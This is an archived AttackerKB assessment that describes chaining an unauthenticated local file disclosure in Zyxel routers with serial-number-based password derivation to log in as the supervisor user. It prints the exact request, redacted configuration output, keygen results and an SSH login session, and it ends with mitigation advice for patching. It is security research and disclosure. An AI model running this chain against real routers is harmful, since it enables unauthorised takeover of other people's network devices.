---
title: Zyxel router chained RCE using LFI and Weak Password Derivation Algorithm (No CVE)
author: h00die-gr3y
score: 3
topic_attacker_value: 5
topic_exploitability: 5
created: '2023-04-14T08:18:36.370289'
revision_date: '2023-04-28T01:23:39.328743'
assessment_id: fbe6c66d-9f1e-45c0-b1bf-34ed01017ea3
topic_id: f567cbf9-5873-48f3-a01f-dd1a0d02eb9f
topic_short_id: dkw2Y2zdyN
topic_slug: zyxel-router-chained-rce-using-lfi-and-weak-password-derivation-algorithm-no-cve
akb_topic_url: https://attackerkb.com/topics/dkw2Y2zdyN/zyxel-router-chained-rce-using-lfi-and-weak-password-derivation-algorithm-no-cve
akb_assessment_url: https://attackerkb.com/topics/dkw2Y2zdyN/zyxel-router-chained-rce-using-lfi-and-weak-password-derivation-algorithm-no-cve#fbe6c66d-9f1e-45c0-b1bf-34ed01017ea3
author_ratings:
  attacker-value: 5
  exploitability: 5
  mitre-tactics: Initial Access
---

# Zyxel router chained RCE using LFI and Weak Password Derivation Algorithm (No CVE)

*Assessment by h00die-gr3y, archived from [AttackerKB](https://attackerkb.com/topics/dkw2Y2zdyN/zyxel-router-chained-rce-using-lfi-and-weak-password-derivation-algorithm-no-cve#fbe6c66d-9f1e-45c0-b1bf-34ed01017ea3).*

---

In December 2022,  `SEC Consult` released a blog with the title [The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/). The blog explains an unauthenticated buffer overflow in more then 40 different Zyxel router models and the fast amount of thousands of routers that are vulnerable and accessible via the Internet.
The impact is still quite limited because the published [Metasploit exploit module](https://github.com/rapid7/metasploit-framework/pull/17388) only works from the LAN side.

However, the **Unauthenticated Buffer Overflow** is not the only vulnerability on these routers and `SEC Consult` discovered another 7 vulnerabilities that are described in their security analysis [Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
While reading the security analysis and reviewing the other vulnerabilities, I discovered a new opportunity to build an exploit by chaining two other vulnerabilities that will allow an unauthenticated attacker to get privileged access to the Zyxel router from either the WAN or LAN side. The potential of this exploit to attack from the WAN side makes it quite dangerous taking into account the large number of non-patched Zyxel routers out there on the Internet.

Recently, [CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770) has been released covering the LFI vulnerability that is used in this  chained exploit.

## Zyxel router chained RCE 
### Exploiting an unauthenticated  local file disclosure (LFI) vulnerability and a weak password derivation algorithm
The first vulnerability that stood out to me is the LFI vulnerability that is discussed in section 2 of the [Security Analysis by SEC Consult](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
The LFI vulnerability is present in the `zhttp` binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.

The burp request below shows a redacted response of the information that is disclosed such as encrypted passwords, account information, information on services configuration (FTP, Telnet, SSH), and hardware details such as serial number, hardware model etc. In total around 4000 lines of nested `JSON` information that you would not like to share with anyone out there.
 
**LFI Burp request and response**
```
GET /Export_Log?/data/zcfg_config.json HTTP/1.1
Host: zyxel-vuln-router:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close
```
**Response (REDACTED)**
```json
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 148678
Date: Fri, 14 Apr 2023 08:47:46 GMT
X-Frame-Options: sameorigin
Content-Security-Policy: frame-ancestors 'self'

---- Hardware Information ----
{
    "Manufacturer":"ZYXEL",
    "ManufacturerOUI":"XXXXX",
    "ModelName":"VMG3625-T20A",
    "Description":"Wireless AC VDSL2 4-port Gateway with USB",
    "ProductClass":"VMG3625-T20A",
    "SerialNumber":"SXXXXXXXXXXXX",
    "SoftwareVersion":"V5.30(ABOU.2)b1_I0_20180821",
    "AdditionalHardwareVersion":"",
    "AdditionalSoftwareVersion":"",
    "UpTime":607055,
    "FirstUseDate":"2023-03-21T09:07:41",
    "VendorConfigFileNumberOfEntries":0,
    "SupportedDataModelNumberOfEntries":0,
    "ProcessorNumberOfEntries":0,
    "VendorLogFileNumberOfEntries":0,
    "LocationNumberOfEntries":0,
    "FixManufacturerOUI":""
  },

---- Account Information----
"X_ZYXEL_LoginCfg":{
    "LoginGroupConfigurable":true,
    "LogGp":[
      {
        "GP_Privilege":"_encrypt_XXXXXXXXXXXXXX",
        "Account":[
          {
            "AutoShowQuickStart":false,
            "Enabled":true,
            "EnableQuickStart":true,
            "Page":"",
            "Username":"root",
            "Password":"",
            "PasswordHash":"",
            "Privilege":"_encrypt_XXXXXXXXXXXXX",
            "GetConfigByFtp":true,
            "DefaultPassword":"_encrypt_XXXXXXXXXXXXXX",
            "DefaultGuiPassword":"",
            "ResetDefaultPassword":false,
            "shadow":"root:$6$XXXXXXXXXXX:0::::::\n",
            "smbpasswd":"root:0:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\n",
            "ConfigAccountFromWAN":false,
            "DefPwLength":8,
            "AccountCreateTime":0,
            "AccountRetryTime":3,
            "AccountIdleTime":300,
            "AccountLockTime":300,
            "RemoHostAddress":"",
            "DotChangeDefPwd":false,
            "ShowSkipBtnInChgDefPwdPage":false,
            "AutoGenPwdBySn":false,
            "RemoteAccessPrivilege":"LAN",
            "OldDefaultPassword":"",
            "CardOrder":"",
            "ThemeColor":"",
            "HiddenPage":""
          },
          {
            "AutoShowQuickStart":false,
            "Enabled":true,
            "EnableQuickStart":true,
            "Page":"",
            "Username":"supervisor",
            "Password":"",
            "PasswordHash":"",
            "Privilege":"_encrypt_XXXXXXXXXXX",
            "DefaultPassword":"_encrypt_XXXXXXXXXXX",
            "DefaultGuiPassword":"",
            "ResetDefaultPassword":false,
            "shadow":"supervisor:$6$XXXXXXXXXX:0::::::\n",
            "smbpasswd":"supervisor:12:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\n",
            "ConfigAccountFromWAN":false,
            "DefPwLength":8,
            "AccountCreateTime":0,
            "AccountRetryTime":3,
            "AccountIdleTime":300,
            "AccountLockTime":300,
            "RemoHostAddress":"",
            "DotChangeDefPwd":false,
            "ShowSkipBtnInChgDefPwdPage":false,
            "AutoGenPwdBySn":false,
            "RemoteAccessPrivilege":"LAN",
            "OldDefaultPassword":"",
            "CardOrder":"",
            "ThemeColor":"",
            "HiddenPage":""
          }
        ],
        "Level":"high"
      },

---- Service Information ----
  "X_ZYXEL_RemoteManagement":{
    "Service":[
      {
        "Name":"HTTP",
        "Enable":true,
        "Protocol":6,
        "Port":8080,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":1,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"HTTPS",
        "Enable":true,
        "Protocol":6,
        "Port":443,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"FTP",
        "Enable":true,
        "Protocol":6,
        "Port":21,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"TELNET",
        "Enable":true,
        "Protocol":6,
        "Port":23,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"SSH",
        "Enable":true,
        "Protocol":6,
        "Port":22,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
```
Now this information disclosure in itself will not pose a direct threat to these routers, but of course attackers could try to crack the obtained encrypted shadow passwords, but this will take a long time.

So is there any other way to use the disclosed information for a successful attack?
 And of course the answer is `YES!`

The second vulnerability that comes into play is the vulnerability described in section 3 of the analysis, **"Unsafe Storage of Sensitive Data"**. 
It explains the password derivation technique used to decrypt the `_encrypted_XXXXXX` passwords in the `JSON` configuration file using a static `AES Key and IV`.
But my attention was more drawn to another analysis [Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/) done by `Thomas Rinsma` in 2020 that was referenced at the bottom of the section and where Thomas explains the password derivation techniques used on Zyxel routers.
In particular, section **"Tangent 2: key and password derivation mechanisms"** is quite interesting which describes in detail how the `supervisor` user password can be derived using the serial key of the router.

So what if we use the LFI vulnerability to get the serial key of the router and try to crack the `supervisor` password using this password derivation technique. 
We can then use the disclosed router services information  to check if `ssh` or `telnet` is enabled and accessible from the WAN and try to login as `supervisor` to gain access to the router.

`Bogi Napoleon Wennerstrøm` has reverse engineered and implemented  some of these derivation functions producing the `supervisor` password.
His repository can be found [here](https://github.com/boginw/zyxel-vmg8825-keygen) on Github.
I tested his password derivation functions and indeed I can confirm that either `zcfgBeCommonGenKeyBySerialNumMethod2` or `zcfgBeCommonGenKeyBySerialNumMethod3` are working on vulnerable Zyxel routers.

```console
# python ./main.py SXXXXXXXXXXXX <= redacted
zcfgBeCommonGenKeyBySerialNum                   : L8PBA3JD6H
zcfgBeCommonGenKeyBySerialNum_CBT               : 4a88dfa2
zcfgBeCommonGenKeyBySerialNumMethod2            : 4a88dfa2
=> zcfgBeCommonGenKeyBySerialNumMethod3         : aN66Q5D31Y <=
zcfgBeCommonGenKeyBySerialNumConfigLength(1)    : 778V3W7O
zcfgBeCommonGenKeyBySerialNumConfigLength(2)    : Yd3HvMpU
zcfgBeCommonGenKeyBySerialNumConfigLength(3)    : dByHvMzZ
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(1) : 778V3W7O
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(2) : Yd3HvMpU
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(3) : dByHvMzZ
┌──(root💀cuckoo)-[~/zyxel_exploit/zyxel-vmg8825-keygen]
└─# ssh supervisor@zyxel-vuln-router
supervisor@zyxel-vuln-router's password:
$ uname -a
Linux VMG3625-T20A 2.6.36 #7 SMP Sat Aug 18 12:18:02 CET 2018 mips GNU/Linux
$ ﻿id
uid=12(supervisor) gid=12 groups=12
$
```
I have created a `Metasploit` module that chains these two vulnerabilities together to gain access to vulnerable Zyxel routers. 
[PR submission](https://github.com/rapid7/metasploit-framework/pull/17881) to mainstream `Metasploit` is in progress.

### Mitigation
Please follow this [Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities) of Zyxel to patch your router.
As temporary measure, you should disable all your services on the router such as `telnet`, `ftp` and `ssh` that allows access to the `supervisor` user and configure your web interface only to be accessible by the `admin` user.

### References
[CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770)
[The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/).
[Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
[Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/)
[Zyxel VMG8825-T50 Supervisor Keygen - Github](https://github.com/boginw/zyxel-vmg8825-keygen) 
[Zyxel Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities)
[ Metasploit PR: Zyxel router chained RCE using LFI and weak password derivation algorithm](https://github.com/rapid7/metasploit-framework/pull/17881)

### Credits
Credits goes to:
[SEC Consult team](https://sec-consult.com/contact/)
[Thomas Rinsma] (https://www.linkedin.com/in/thomasrinsma)
[Bogi Napoleon Wennerstrøm](https://github.com/boginw)
